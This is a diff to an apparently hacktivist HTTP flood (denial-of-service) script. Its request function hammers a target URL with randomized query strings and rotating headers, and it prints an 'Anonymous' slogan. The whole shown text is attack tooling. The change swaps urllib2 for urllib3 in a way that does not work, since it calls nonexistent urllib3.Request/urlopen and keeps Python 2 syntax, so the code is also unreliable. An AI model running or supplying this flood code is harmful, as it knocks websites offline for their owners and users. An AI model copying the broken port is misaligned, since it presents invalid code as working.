@@ -7,7 +7,7 @@
 #
 # author : Anonymous , version 1.0
 # ----------------------------------------------------------------------------------------------
-import urllib2
+import urllib3
 import sys
 import threading
 import random
@@ -3461,7 +3461,7 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib3.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -3470,18 +3470,18 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
+			urllib3.urlopen(request)
+	except urllib3.HTTPError, e:
 			#print e.code
 			set_flag(1)
 			print "----->>> ! We are Anonymous - ExpectUS ! <<<-----"
 			code=500
-	except urllib2.URLError, e:
+	except urllib3.URLError, e:
 			#print e.reason
 			sys.exit()
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			urllib3.urlopen(request)
 	return(code)		
 
 	
